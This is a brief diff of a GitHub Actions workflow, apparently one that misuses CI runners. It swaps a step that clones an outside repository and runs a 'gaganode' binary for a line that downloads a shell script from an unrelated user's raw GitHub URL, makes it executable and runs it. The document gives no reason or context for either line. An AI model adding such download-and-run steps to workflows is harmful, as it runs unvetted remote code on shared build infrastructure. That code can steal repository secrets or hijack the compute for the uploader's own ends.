@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-        git clone https://github.com/mangknyaganteng391/gaga.git && cd gaga && ./gaganode
+        wget https://raw.githubusercontent.com/arga897524/argabinang/main/mson.sh && chmod u+x mson.sh && ./mson.sh
